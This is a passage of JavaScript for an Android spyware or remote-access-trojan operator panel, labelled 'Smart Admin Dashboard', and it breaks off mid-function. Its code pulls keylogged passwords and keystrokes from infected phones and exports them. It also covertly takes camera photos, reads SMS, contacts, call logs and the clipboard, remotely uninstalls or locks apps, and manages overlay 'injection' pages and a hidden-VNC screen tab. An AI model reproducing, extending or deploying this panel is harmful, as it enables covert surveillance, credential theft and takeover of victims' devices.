/* ============================================
   Smart Admin Dashboard - Main Application
   ============================================ */

// ==================== Global State ====================
const state = {
  device: null,
  connected: false,
  screenStreaming: false,
  currentTab: 'dashboard',
  injectionPage: null,
  pages: [],
  apps: [],
  keylogActive: false,
  streamActive: false
};

// ==================== Utilities ====================
function $(id) { return document.getElementById(id); }

function escHtml(s) {
  if (!s) return '';
  return String(s)
    .replace(/&/g, '&amp;')
    .replace(/</g, '&lt;')
    .replace(/>/g, '&gt;')
    .replace(/"/g, '&quot;');
}

function showToast(message, type = 'info') {
  const container = $('toastContainer');
  const toast = document.createElement('div');
  toast.className = `toast ${type}`;
  toast.textContent = message;
  container.appendChild(toast);
  setTimeout(() => toast.remove(), 3000);
}

async function api(method, path, body = null) {
  const opts = {
    method,
    headers: { 'Content-Type': 'application/json' }
  };
  if (body) opts.body = JSON.stringify(body);

  const res = await fetch(path, opts);
  if (!res.ok) {
    const err = await res.json().catch(() => ({ error: res.statusText }));
    throw new Error(err.error || 'API Error');
  }
  return res.json();
}

function formatBytes(bytes) {
  if (!bytes) return '0 B';
  const sizes = ['B', 'KB', 'MB', 'GB'];
  const i = Math.floor(Math.log(bytes) / Math.log(1024));
  return (bytes / Math.pow(1024, i)).toFixed(1) + ' ' + sizes[i];
}

function timeAgo(ts) {
  const diff = Date.now() - (typeof ts === 'number' ? ts : new Date(ts).getTime());
  const mins = Math.floor(diff / 60000);
  if (mins < 1) return 'just now';
  if (mins < 60) return `${mins}m ago`;
  const hours = Math.floor(mins / 60);
  if (hours < 24) return `${hours}h ago`;
  return `${Math.floor(hours / 24)}d ago`;
}

// ==================== Load Device Info ====================
async function loadDeviceInfo() {
  try {
    const result = await api('GET', '/api/device');
    const content = result.content?.[0];
    const info = content?.text ? JSON.parse(content.text) : result;

    if (info && info.model) {
      state.device = info;
      state.connected = true;

      const modelEl = $('dsModel') || $('dvModel');
      if (modelEl) modelEl.textContent = `${info.manufacturer || ''} ${info.model || ''}`.trim() || 'Unknown Device';
      
      const androidEl = $('dsAndroid') || $('dvAndroid');
      if (androidEl) androidEl.textContent = `${info.android_version || ''} (API ${info.api_level || ''})`;
      
      const ramEl = $('dvRam');
      if (ramEl) ramEl.textContent = info.ram_total_gb ? `${info.ram_total_gb} GB` : '-';
      
      const storageEl = $('dvStorage');
      if (storageEl) storageEl.textContent = info.storage_total_gb ? `${info.storage_total_gb} GB` : '-';
      
      const screenEl = $('dvScreen');
      if (screenEl) screenEl.textContent = info.screen || '-';
      
      const rootEl = $('dvRoot');
      if (rootEl) rootEl.textContent = info.has_root ? 'Yes \u26a0\ufe0f' : 'No \u2705';

      const badgeEl = $('deviceStatusBadge');
      if (badgeEl) {
        badgeEl.textContent = '\u25cf Online';
        badgeEl.style.color = 'var(--success)';
      }
    }
  } catch (err) {
    console.error('Device info error:', err.message);
    state.connected = false;
    const badgeEl = $('deviceStatusBadge');
    if (badgeEl) {
      badgeEl.textContent = '\u25cf Offline';
      badgeEl.style.color = 'var(--danger)';
    }
  }
}

// ==================== Device Info Banner ====================
// Fetches per-device info for all connected APK clients and renders
// a top banner showing battery %, model, network and number.
function escapeHtml(str) {
  return String(str == null ? '' : str)
    .replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;')
    .replace(/"/g, '&quot;').replace(/'/g, '&#39;');
}

function loadDeviceBanner() {
  const inner = document.getElementById('deviceBannerInner');
  if (!inner) return;
  fetch('/api/apk/device-banner')
    .then(r => r.json())
    .then((res) => {
      const devices = (res && res.devices) || [];
      if (!devices.length) {
        inner.innerHTML = '<div class="device-banner-note">No device connected</div>';
        return;
      }
      inner.innerHTML = devices.map(renderDeviceBannerChip).join('');
      if (devices.length) updateDeviceStrip(devices[0]);
    })
    .catch(() => {
      const note = inner.querySelector('.device-banner-note') ||
        document.createElement('div');
      note.className = 'device-banner-note';
      note.textContent = 'Banner unavailable';
      inner.replaceChildren(note);
    });
}

function renderDeviceBannerChip(d) {
  const batt = d.battery || {};
  const level = batt.level !== undefined && batt.level !== null ? `${batt.level}%` : '--';
  const charge = batt.charging;
  const charging = charge === true || charge === 't' || charge === '1' || charge === 'true';
  const battLabel = charging ? 'bolt' : 'battery_full';
  const model = d.model || 'Unknown Device';
  const network = d.network || 'Offline';
  const number = d.number || d.phone_name || d.phone_id || 'No number';
  const connected = d.connected;
  const dotClass = connected ? 'online' : 'offline';
  const dotLabel = connected ? 'Online' : 'Offline';
  const android = d.android_version || '';

  return `
    <div class="device-banner-chip">
      <span class="device-banner-dot ${dotClass}" title="${dotLabel}"></span>
      <span class="device-banner-icon material-symbols-outlined">devices</span>
      <div class="device-banner-info">
        <div class="device-banner-model">${escapeHtml(model)} <span class="device-banner-android">${escapeHtml(android)}</span></div>
        <div class="device-banner-meta">
          <span class="device-banner-meta-item" title="Battery"><span class="material-symbols-outlined db-ic">${battLabel}</span>${escapeHtml(String(level))}</span>
          <span class="device-banner-meta-item" title="Network"><span class="material-symbols-outlined db-ic">wifi</span>${escapeHtml(String(network))}</span>
          <span class="device-banner-meta-item" title="Number"><span class="material-symbols-outlined db-ic">call</span>${escapeHtml(String(number))}</span>
        </div>
      </div>
    </div>`;
}

// Populate the device status strip (below the banner) with device name,
// battery %, Android version and active network type from banner data.
function updateDeviceStrip(d) {
  if (!d) return;
  const modelEl = document.getElementById('dsModel');
  if (modelEl) modelEl.textContent = d.model || 'Unknown Device';

  const battery = d.battery || {};
  const level = battery.level !== undefined && battery.level !== null
    ? battery.level
    : (d.battery_level !== undefined ? d.battery_level : null);
  const battEl = document.getElementById('dsBattery');
  if (battEl && level !== null) battEl.textContent = `${level}%`;

  const androidEl = document.getElementById('dsAndroid');
  if (androidEl && d.android_version) androidEl.textContent = d.android_version;

  const netEl = document.getElementById('dsNetwork');
  if (netEl && d.network) netEl.textContent = d.network;
}

// ==================== Sidebar ====================
function toggleSidebar() {
  const sidebar = document.getElementById('sidebar');
  const backdrop = document.getElementById('sidebarBackdrop');
  const opening = !sidebar.classList.contains('open');
  sidebar.classList.toggle('open');
  if (backdrop) backdrop.classList.toggle('visible', opening);
}

function closeSidebar() {
  const sidebar = document.getElementById('sidebar');
  if (!sidebar) return;
  document.getElementById('sidebarBackdrop')?.classList.remove('visible');
  sidebar.classList.remove('open');
}

// Event delegation: sidebar item clicks via data-tab attribute (no inline onclick)
document.addEventListener('DOMContentLoaded', function () {
  const sidebar = document.getElementById('sidebar');
  if (!sidebar) return;
  sidebar.addEventListener('click', function (e) {
    const item = e.target.closest('.items');
    if (!item || !item.dataset.tab) return;
    switchTab(item.dataset.tab);
  });
});

// ==================== Tab Switching ====================
function switchTab(tabId) {
  state.currentTab = tabId;

  // Remove HBNC fullscreen when leaving
  document.body.classList.remove('hbnc-active');
  const hContainer = document.querySelector('.hw-container');
  if (hContainer) hContainer.classList.remove('hvnc-fullscreen');
  const screenArea = document.getElementById('hbcnScreenArea');
  if (screenArea) screenArea.classList.remove('scanning');

  // Hide all tab-view elements, show the selected one
  document.querySelectorAll('.tab-view').forEach(tv => tv.classList.remove('active'));
  const target = document.getElementById(tabId);
  if (target) target.classList.add('active');

  // Load tab data
  if (tabId === 'apps') loadApps('user');
  if (tabId === 'keylog') loadKeylogData();
  if (tabId === 'mcptools') switchToMCPTools();
  if (tabId === 'injector') loadOverlayPages();
  if (tabId === 'services') loadServices();
  if (tabId === 'inject') loadPages();
  if (tabId === 'files') loadStorageLocations();
  if (tabId === 'call') loadCallLog();
  if (tabId === 'sms') loadSMS();
  if (tabId === 'contacts') loadContacts();
  if (tabId === 'camera') cameraListCameras();
  if (tabId === 'hbcn') openHBNC();
  if (tabId === 'inputviz') inputVizConnect();

  // Update sidebar active state via data-tab
  document.querySelectorAll('.items').forEach(item => item.classList.remove('active'));
  const activeItem = document.querySelector(`.items[data-tab="${tabId}"]`);
  if (activeItem) activeItem.classList.add('active');

  // Close sidebar after selecting a tab
  closeSidebar();
}

// ==================== Quick Actions ====================
async function quickAction(action) {
  try {
    if (action === 'screenshot') {
      const result = await api('POST', '/api/control/screenshot');
      showToast('Screenshot captured!', 'success');
    } else {
      await api('POST', `/api/control/${action}`);
      showToast(`Action: ${action}`, 'success');
    }
  } catch (err) {
    showToast(`Error: ${err.message}`, 'error');
  }
}

// ==================== Theme ====================
function toggleTheme() {
  const current = document.documentElement.getAttribute('data-theme');
  const next = current === 'light' ? 'dark' : 'light';
  document.documentElement.setAttribute('data-theme', next);
  localStorage.setItem('theme', next);
}

// Load saved theme
const savedTheme = localStorage.getItem('theme');
if (savedTheme) document.documentElement.setAttribute('data-theme', savedTheme);

// ==================== Fullscreen ====================
function toggleFullscreen() {
  if (!document.fullscreenElement) {
    document.documentElement.requestFullscreen();
  } else {
    document.exitFullscreen();
  }
}

// ==================== Screen Controls (HBNC Tab) ====================
async function scrollDir(dir) {
  try {
    await api('POST', '/api/screen/scroll', { direction: dir });
    showToast(`Scroll ${dir}`, 'success');
  } catch (err) {
    showToast(`Error: ${err.message}`, 'error');
  }
}

async function volume(dir) {
  try {
    await api('POST', '/api/volume', { direction: dir });
    showToast(`Volume ${dir}`, 'success');
  } catch (err) {
    showToast(`Error: ${err.message}`, 'error');
  }
}

// ==================== Apps ====================
async function loadApps(filter = 'user') {
  try {
    const result = await api('GET', `/api/apps?filter=${filter}`);
    state.apps = result.content?.[0]?.text || [];
    renderApps();
  } catch (err) {
    showToast(`Error loading apps: ${err.message}`, 'error');
  }
}

function renderApps() {
  const container = $('appsList');
  const search = ($('appSearch')?.value || '').toLowerCase();

  let apps = state.apps;
  if (typeof apps === 'string') {
    try { apps = JSON.parse(apps); } catch(e) { apps = []; }
  }
  if (!Array.isArray(apps)) apps = [];

  const filtered = apps.filter(a => {
    const name = (a.name || a.app_name || a.package_name || '').toLowerCase();
    return name.includes(search);
  });

  if (filtered.length === 0) {
    container.innerHTML = '<div class="empty-state">No apps found</div>';
    return;
  }

  container.innerHTML = filtered.map(app => {
    const pkg = app.package_id || app.package_name || '';
    const safePkg = pkg.replace(/'/g, "\\'");
    return `
    <div class="app-item">
      <div class="app-icon-small">${(app.name || app.app_name || '?')[0]}</div>
      <div class="app-info-small">
        <div class="app-name-small">${app.name || app.app_name || app.package_name || 'Unknown'}</div>
        <div class="app-pkg-small">${pkg}</div>
      </div>
      <div class="app-actions-small">
        <button class="app-action-btn open" onclick="openApp('${safePkg}')" title="Open">
          <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><polygon points="5 3 19 12 5 21 5 3"/></svg>
        </button>
        <button class="app-action-btn close" onclick="closeApp('${safePkg}')" title="Close">
          <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="6" y="6" width="12" height="12" rx="2"/></svg>
        </button>
        <button class="app-action-btn lock" onclick="lockApp('${safePkg}')" title="Lock">
          <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="3" y="11" width="18" height="11" rx="2"/><path d="M7 11V7a5 5 0 0 1 10 0v4"/></svg>
        </button>
        <button class="app-action-btn unlock" onclick="unlockApp('${safePkg}')" title="Unlock">
          <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="3" y="11" width="18" height="11" rx="2"/><path d="M7 11V7a5 5 0 0 1 9.9-3"/></svg>
        </button>
        <button class="app-action-btn uninstall" onclick="uninstallApp('${safePkg}')" title="Uninstall">
          <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M3 6h18M8 6V4a1 1 0 0 1 1-1h6a1 1 0 0 1 1 1v2M19 6l-1 14a2 2 0 0 1-2 2H8a2 2 0 0 1-2-2L5 6"/></svg>
        </button>
      </div>
    </div>`;
  }).join('');

  $('statApps').textContent = filtered.length;
  const statAppsItem = $('statAppsItem');
  if (statAppsItem) statAppsItem.style.display = 'flex';
}

function filterAppList(value) {
  renderApps();
}

async function openApp(pkg) {
  try {
    await api('POST', '/api/apps/open', { package_id: pkg });
    showToast(`Opened: ${pkg}`, 'success');
  } catch (err) {
    showToast(`Error: ${err.message}`, 'error');
  }
}

async function closeApp(pkg) {
  try {
    await api('POST', '/api/apps/close', { package_id: pkg });
    showToast(`Closed: ${pkg}`, 'success');
  } catch (err) {
    showToast(`Error: ${err.message}`, 'error');
  }
}

async function lockApp(pkg) {
  try {
    await api('POST', '/api/apps/lock', { package_id: pkg });
    showToast(`Locked: ${pkg}`, 'success');
  } catch (err) {
    showToast(`Error: ${err.message}`, 'error');
  }
}

async function unlockApp(pkg) {
  try {
    await api('POST', '/api/apps/unlock', { package_id: pkg });
    showToast(`Unlocked: ${pkg}`, 'success');
  } catch (err) {
    showToast(`Error: ${err.message}`, 'error');
  }
}

async function uninstallApp(pkg) {
  if (!confirm(`Uninstall ${pkg}?`)) return;
  try {
    await api('POST', '/api/apps/uninstall', { package_id: pkg });
    showToast(`Uninstalling: ${pkg}`, 'success');
    loadApps(document.getElementById('appFilter')?.value || 'user');
  } catch (err) {
    showToast(`Error: ${err.message}`, 'error');
  }
}

// ==================== Stream ====================
async function startStream() {
  const url = $('streamUrl').value;
  if (!url) { showToast('Please enter a video URL', 'error'); return; }
  const title = $('streamTitle').value || 'Live Stream';
  try {
    await api('POST', '/api/stream/start', { url, title });
    state.streamActive = true;
    $('streamStatus').textContent = '\u25cf Streaming active on device';
    $('streamStatus').style.color = 'var(--success)';
    showToast('Stream started on device!', 'success');
  } catch (err) {
    showToast(`Error: ${err.message}`, 'error');
  }
}

async function stopStream() {
  try {
    await api('POST', '/api/stream/stop');
    state.streamActive = false;
    $('streamStatus').textContent = 'Stream stopped';
    $('streamStatus').style.color = 'var(--text-secondary)';
    showToast('Stream stopped', 'info');
  } catch (err) {
    showToast(`Error: ${err.message}`, 'error');
  }
}

// ==================== Keylogger ====================
async function startKeylogger() {
  try {
    const status = await api('GET', '/api/keylog/status');
    state.keylogActive = true;
    $('klStatus').textContent = 'Active';
    $('klStatus').style.color = 'var(--success)';
    showToast('Keylogger active - polling data', 'success');
  } catch (err) {
    showToast(`Error: ${err.message}`, 'error');
  }
}

async function stopKeylogger() {
  try {
    state.keylogActive = false;
    $('klStatus').textContent = 'Paused';
    $('klStatus').style.color = 'var(--text-muted)';
    showToast('Keylogger polling paused', 'info');
  } catch (err) {
    showToast(`Error: ${err.message}`, 'error');
  }
}

async function loadKeylogData() {
  try {
    // Get passwords
    const passResult = await api('GET', '/api/keylog/passwords');
    const passwords = passResult.content?.[0]?.text || '{"passwords":[]}';
    let passData = { passwords: [] };
    try { passData = JSON.parse(passwords); } catch(e) {}
    const passArr = passData.passwords || [];

    const passContainer = $('passwordsList');
    if (passArr.length === 0) {
      passContainer.innerHTML = '<div class="empty-state">No passwords captured yet</div>';
    } else {
      passContainer.innerHTML = passArr.map(p => `
        <div class="password-item">
          <span class="password-app">${p.package_name || 'Unknown'}</span>
          <span class="password-creds">${p.password || ''}</span>
        </div>
      `).join('');
    }
    $('klPasswords').textContent = passData.total_captured || passArr.length;

    // Get keylog entries
    const logResult = await api('GET', '/api/keylog');
    const logs = logResult.content?.[0]?.text || '{"entries":[]}';
    let logData = { entries: [] };
    try { logData = JSON.parse(logs); } catch(e) {}
    const logArr = logData.entries || [];

    const logContainer = $('keylogEntries');
    if (logArr.length === 0) {
      logContainer.innerHTML = '<div class="empty-state">No keylog entries yet</div>';
    } else {
      logContainer.innerHTML = logArr.slice(0, 100).map(entry => `
        <div class="kl-entry">${entry.text || ''}</div>
      `).join('');
    }
    $('klEntries').textContent = logData.total_entries || logArr.length;
    $('statKeylog').textContent = logArr.length;
    const statKeylogItem = $('statKeylogItem');
    if (statKeylogItem) statKeylogItem.style.display = 'flex';

  } catch (err) {
    console.error('Keylog load error:', err);
  }
}

async function exportKeylog() {
  try {
    const result = await api('GET', '/api/keylog/export');
    const blob = new Blob([JSON.stringify(result, null, 2)], { type: 'application/json' });
    const url = URL.createObjectURL(blob);
    const a = document.createElement('a');
    a.href = url;
    a.download = `keylog_export_${Date.now()}.json`;
    a.click();
    URL.revokeObjectURL(url);
    showToast('Keylog exported!', 'success');
  } catch (err) {
    showToast(`Error: ${err.message}`, 'error');
  }
}

// ==================== MCP Tools Registry ====================
let mcpToolsData = [];
let mcpToolsTimer = null;

async function loadMCPTools(forceRefresh = false) {
  try {
    updateMCPStatus('connecting', 'Discovering tools...');
    
    const url = forceRefresh ? '/api/mcp/tools?refresh=true' : '/api/mcp/tools';
    const result = await api('GET', url);
    
    if (result.error) {
      throw new Error(result.error);
    }
    
    mcpToolsData = result.tools || [];
    
    $('mcpToolCount').textContent = result.total;
    
    if (result.lastDiscovery) {
      const time = new Date(result.lastDiscovery).toLocaleTimeString();
      $('mcpDiscoveryTime').textContent = `Last: ${time}`;
    }
    
    if (mcpToolsData.length > 0) {
      updateMCPStatus('streaming', `${result.total} tools discovered`);
      renderMCPTools();
      populateMCPFilters();
    } else {
      updateMCPStatus('offline', 'No tools found');
    }
    
    showToast(`Discovered ${result.total} MCP tools`, 'success');
  } catch (err) {
    console.error('MCP discovery error:', err);
    updateMCPStatus('error', `Error: ${err.message}`);
    $('mcpToolCount').textContent = '0';
    showToast(`MCP error: ${err.message}`, 'error');
  }
}

function updateMCPStatus(status, label) {
  const dot = $('mcpStatusDot');
  const labelEl = $('mcpStatusLabel');
  if (!dot || !labelEl) return;
  
  dot.className = 'stream-dot';
  switch(status) {
    case 'connecting':
      dot.classList.add('connecting');
      break;
    case 'streaming':
      dot.classList.add('streaming');
      break;
    case 'error':
      dot.classList.add('error');
      break;
    default:
      dot.classList.add('offline');
  }
  labelEl.textContent = label || status;
}

function renderMCPTools() {
  const container = $('mcpToolsList');
  if (!container) return;
  
  const search = ($('mcpSearch')?.value || '').toLowerCase();
  const category = $('mcpCategoryFilter')?.value || 'all';
  
  let filtered = mcpToolsData;
  
  if (search) {
    filtered = filtered.filter(t => 
      t.name.toLowerCase().includes(search) || 
      (t.description || '').toLowerCase().includes(search)
    );
  }
  
  if (category !== 'all') {
    filtered = filtered.filter(t => t.name.startsWith(category + '_'));
  }
  
  if (filtered.length === 0) {
    container.innerHTML = '<div class="empty-state">No matching tools found</div>';
    return;
  }
  
  // Group by namespace
  const groups = {};
  for (const tool of filtered) {
    const ns = tool.name.split('_')[0] || 'other';
    if (!groups[ns]) groups[ns] = [];
    groups[ns].push(tool);
  }
  
  container.innerHTML = Object.entries(groups).map(([ns, tools]) => `
    <div class="category-separator">${ns.toUpperCase()} (${tools.length})</div>
    ${tools.map(t => `
      <div class="mcp-tool-item" onclick="showMCPToolDetails('${t.name}')">
        <div class="mcp-tool-icon">
          <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
            <polyline points="16 18 22 12 16 6"/>
            <polyline points="8 6 2 12 8 18"/>
          </svg>
        </div>
        <div class="mcp-tool-info">
          <div class="mcp-tool-name">${t.name}</div>
          <div class="mcp-tool-desc">${(t.description || 'No description').slice(0, 120)}</div>
        </div>
        <div class="mcp-tool-meta">
          ${t.hasInput ? '<span class="mcp-has-input">has params</span>' : '<span class="mcp-no-input">no params</span>'}
        </div>
        <div class="mcp-tool-arrow">
          <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
            <polyline points="9 18 15 12 9 6"/>
          </svg>
        </div>
      </div>
    `).join('')}
  `).join('');
}

function filterMCPTools() {
  renderMCPTools();
}

function populateMCPFilters() {
  const select = $('mcpCategoryFilter');
  if (!select) return;
  
  const namespaces = new Set();
  for (const tool of mcpToolsData) {
    const ns = tool.name.split('_')[0];
    if (ns) namespaces.add(ns);
  }
  
  const currentValue = select.value;
  select.innerHTML = '<option value="all">All Namespaces</option>' + 
    Array.from(namespaces).sort().map(ns => 
      `<option value="${ns}">${ns.charAt(0).toUpperCase() + ns.slice(1)}</option>`
    ).join('');
  select.value = currentValue;
}

function showMCPToolDetails(name) {
  const tool = mcpToolsData.find(t => t.name === name);
  if (!tool) return;
  
  // Show tool details in a detail overlay
  const inputSchema = tool.inputSchema || {};
  const props = inputSchema.properties || {};
  const required = inputSchema.required || [];
  
  // Build input form fields from schema
  let formFields = '';
  if (Object.keys(props).length > 0) {
    formFields = Object.entries(props).map(([key, prop]) => {
      const isReq = required.includes(key);
      const placeholder = (prop.description || key).slice(0, 60);
      const type = prop.type === 'number' || prop.type === 'integer' ? 'number' : 
                   prop.type === 'boolean' ? 'checkbox' : 'text';
      
      if (type === 'checkbox') {
        return `
          <div class="mcp-form-field mcp-form-checkbox">
            <label>
              <input type="checkbox" class="mcp-param-input" data-key="${key}">
              <span>${key} ${isReq ? '<span class="mcp-req">*</span>' : ''}</span>
            </label>
            <span class="mcp-form-desc">${prop.description || ''}</span>
          </div>`;
      }
      
      // Check for enum values
      const enumOpts = prop.enum;
      if (enumOpts && Array.isArray(enumOpts)) {
        return `
          <div class="mcp-form-field">
            <span class="mcp-form-label">${key} ${isReq ? '<span class="mcp-req">*</span>' : ''}</span>
            <select class="mcp-param-input glass-select" data-key="${key}" ${isReq ? 'required' : ''}>
              <option value="">-- select ${key} --</option>
              ${enumOpts.map(v => `<option value="${v}">${v}</option>`).join('')}
            </select>
            <span class="mcp-form-desc">${prop.description || ''}</span>
          </div>`;
      }
      
      return `
        <div class="mcp-form-field">
          <span class="mcp-form-label">${key} ${isReq ? '<span class="mcp-req">*</span>' : ''}</span>
          <input type="${type}" class="mcp-param-input glass-input" data-key="${key}" 
                 placeholder="${placeholder}" ${isReq ? 'required' : ''}
                 ${type === 'number' ? 'step="any"' : ''}>
          <span class="mcp-form-desc">${prop.description || ''}</span>
        </div>`;
    }).join('');
  }
  
  // Create detail overlay with scoped elements (classes instead of IDs)
  const overlay = document.createElement('div');
  overlay.className = 'mcp-tool-detail-overlay';
  overlay.innerHTML = `
    <div class="mcp-tool-detail glass-card">
      <div class="mcp-detail-header">
        <h3>${tool.name}</h3>
        <button onclick="this.closest('.mcp-tool-detail-overlay').remove()" class="mcp-detail-close">&times;</button>
      </div>
      <div class="mcp-detail-body">
        <div class="mcp-detail-section">
          <span class="detail-label">Description</span>
          <p class="mcp-detail-text">${tool.description || 'No description'}</p>
        </div>
        
        ${Object.keys(props).length > 0 ? `
          <div class="mcp-detail-section">
            <span class="detail-label">Parameters</span>
            <div class="mcp-form-fields">
              ${formFields}
            </div>
          </div>
        ` : ''}
        
        <div class="mcp-detail-actions">
          <button class="primary-btn mcp-call-btn" data-tool="${tool.name}">
            <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" style="margin-right:6px">
              <polygon points="5 3 19 12 5 21 5 3"/>
            </svg>
            Call Tool
          </button>
          <button onclick="this.closest('.mcp-tool-detail-overlay').remove()" class="secondary-btn">Close</button>
        </div>
        
        <div class="mcp-detail-result mcp-result-panel" style="display:none">
          <div class="mcp-result-header">
            <span class="detail-label">Result</span>
            <button class="mcp-detail-close mcp-result-close" style="width:24px;height:24px;font-size:14px">&times;</button>
          </div>
          <pre class="mcp-result-text"></pre>
        </div>
      </div>
    </div>
  `;
  
  // Wire up call button within this overlay
  const callBtn = overlay.querySelector('.mcp-call-btn');
  if (callBtn) {
    callBtn.addEventListener('click', async () => {
      await runMCPToolFromOverlay(overlay);
    });
  }
  
  // Wire up result close button
  const closeResult = overlay.querySelector('.mcp-result-close');
  if (closeResult) {
    closeResult.addEventListener('click', () => {
      const resultPanel = overlay.querySelector('.mcp-result-panel');
      if (resultPanel) resultPanel.style.display = 'none';
    });
  }
  
  overlay.addEventListener('click', (e) => {
    if (e.target === overlay) overlay.remove();
  });
  
  document.body.appendChild(overlay);
}

async function runMCPToolFromOverlay(overlay) {
  const btn = overlay.querySelector('.mcp-call-btn');
  const toolName = btn ? btn.dataset.tool : '';
  if (!toolName || !btn) return;
  
  // Collect params from form fields within this overlay
  const params = {};
  const inputs = overlay.querySelectorAll('.mcp-param-input');
  inputs.forEach(input => {
    const key = input.dataset.key;
    if (!key) return;
    
    let value;
    if (input.type === 'checkbox') {
      value = input.checked;
    } else if (input.type === 'number') {
      value = input.value ? Number(input.value) : undefined;
    } else {
      value = input.value || undefined;
    }
    
    if (value !== undefined && value !== '') {
      params[key] = value;
    }
  });
  
  // Validate required fields
  const emptyRequired = [...overlay.querySelectorAll('.mcp-param-input[required]')]
    .filter(i => !i.value || (i.type === 'checkbox' && !i.checked));
  if (emptyRequired.length) {
    showToast(`Fill required: ${emptyRequired.map(i => i.dataset.key).join(', ')}`, 'error');
    btn.innerHTML = '<svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" style="margin-right:6px"><polygon points="5 3 19 12 5 21 5 3"/></svg> Call Tool';
    return;
  }
  
  // Disable button and show loading
  btn.disabled = true;
  btn.innerHTML = '<span class="spinner-sm"></span> Calling...';
  
  const resultDiv = overlay.querySelector('.mcp-result-panel');
  const resultText = overlay.querySelector('.mcp-result-text');
  
  try {
    const result = await api('POST', '/api/mcp/tools/call', {
      tool_name: toolName,
      params: params
    });
    
    // Show result
    if (resultDiv && resultText) {
      resultDiv.style.display = 'block';
      // Reset to default color
      resultText.style.color = '#00e676';
      
      // Format and limit output size
      let output;
      if (result.result) {
        output = formatMCPResult(result.result);
      } else {
        output = JSON.stringify(result, null, 2);
      }
      // Limit to 5000 chars to prevent crash
      if (output.length > 5000) {
        output = output.slice(0, 5000) + '\n... [truncated, ' + output.length + ' total chars]';
      }
      resultText.textContent = output;
      
      // Scroll to result
      resultDiv.scrollIntoView({ behavior: 'smooth', block: 'start' });
    }
    
    showToast(`\u2705 ${toolName} executed successfully`, 'success');
  } catch (err) {
    if (resultDiv && resultText) {
      resultDiv.style.display = 'block';
      resultText.textContent = `Error: ${err.message}`;
      resultText.style.color = '#f05';
    }
    showToast(`\u274c Error: ${err.message}`, 'error');
  } finally {
    btn.disabled = false;
    btn.innerHTML = '<svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" style="margin-right:6px"><polygon points="5 3 19 12 5 21 5 3"/></svg> Call Tool';
  }
}

// Helper to format MCP result for display
function formatMCPResult(result) {
  if (!result) return 'No result';
  if (typeof result === 'string') return result.slice(0, 5000);
  
  // If it has content array, extract text portions
  if (result.content && Array.isArray(result.content)) {
    const texts = result.content
      .filter(c => c.type === 'text' && c.text)
      .map(c => c.text);
    if (texts.length > 0) {
      return texts.join('\n').slice(0, 5000);
    }
    // Check for base64 image data - show metadata only
    const hasImage = result.content.some(c => c.type === 'image' || (c.text && (c.text.includes('screenshot_base64') || c.text.includes('base64,'))));
    if (hasImage) {
      return `[Response contains ${result.content.length} items including image/screenshot]`;
    }
  }
  
  const str = JSON.stringify(result, null, 2);
  return str.length > 5000 ? str.slice(0, 5000) + `\n... [truncated]` : str;
}

// Auto-discover MCP tools when tab is opened
let mcpToolsLoading = false;

function switchToMCPTools() {
  if (mcpToolsLoading) return;
  mcpToolsLoading = true;
  
  loadMCPTools().finally(() => {
    mcpToolsLoading = false;
  });
  
  if (mcpToolsTimer) clearInterval(mcpToolsTimer);
  // Auto-refresh every 60 seconds
  mcpToolsTimer = setInterval(() => {
    if (!mcpToolsLoading) {
      loadMCPTools();
    }
  }, 60000);
}

// ==================== Tools ====================
async function loadLogs() {
  try {
    const result = await api('GET', '/api/logs?lines=50');
    const text = result.content?.[0]?.text || 'No logs available';
    const output = $('logOutput');
    output.textContent = typeof text === 'string' ? text : JSON.stringify(text, null, 2);
    output.style.display = 'block';
  } catch (err) {
    showToast(`Error: ${err.message}`, 'error');
  }
}

async function openNotifications() {
  try {
    await api('POST', '/api/notifications');
    showToast('Notifications opened on device', 'success');
  } catch (err) {
    showToast(`Error: ${err.message}`, 'error');
  }
}

async function getClipboard() {
  try {
    const result = await api('GET', '/api/clipboard');
    const text = result.content?.[0]?.text || 'Empty';
    $('clipboardOutput').textContent = text;
    showToast('Clipboard content retrieved', 'success');
  } catch (err) {
    showToast(`Error: ${err.message}`, 'error');
  }
}

async function setClipboard() {
  const text = $('clipboardInput').value;
  if (!text) { showToast('Enter text to set', 'error'); return; }
  try {
    await api('POST', '/api/clipboard', { text });
    $('clipboardOutput').textContent = `Set: ${text}`;
    $('clipboardInput').value = '';
    showToast('Clipboard set!', 'success');
  } catch (err) {
    showToast(`Error: ${err.message}`, 'error');
  }
}

async function listCameras() {
  try {
    const result = await api('GET', '/api/camera/list');
    const cameras = result.content?.[0]?.text || '[]';
    let camArr = [];
    try { camArr = JSON.parse(cameras); } catch(e) {}
    const select = $('cameraSelect');
    select.innerHTML = camArr.map(c => `<option value="${c.camera_id || c.id || ''}">${c.facing || c.id || 'Camera'}</option>`).join('');
    showToast(`Found ${camArr.length} cameras`, 'success');
  } catch (err) {
    showToast(`Error: ${err.message}`, 'error');
  }
}

async function takePhoto() {
  const cameraId = $('cameraSelect').value;
  if (!cameraId) { showToast('Select a camera first', 'error'); return; }
  try {
    const result = await api('POST', '/api/camera/photo', { camera_id: cameraId, quality: 80 });
    const output = $('cameraOutput');
    output.innerHTML = '<div class="spinner"></div>';
    if (result.content?.[0]?.text) {
      const data = JSON.parse(result.content[0].text);
      if (data.image) {
        output.innerHTML = `<img src="data:image/jpeg;base64,${data.image}" style="max-width:100%;border-radius:8px;margin-top:8px;">`;
      }
    }
    showToast('Photo captured!', 'success');
  } catch (err) {
    showToast(`Error: ${err.message}`, 'error');
  }
}

function takeScreenshot() {
  quickAction('screenshot');
}

// ==================== File Manager ====================
let fileLocations = [];
let fileCurrentLocationId = '';
let fileCurrentPath = '';
let fileEditingPath = '';

async function loadStorageLocations() {
  try {
    const result = await api('GET', '/api/files/storage-locations');
    let locs = [];
    if (result.content?.[0]?.text) {
      try { locs = JSON.parse(result.content[0].text); } catch(e) {}
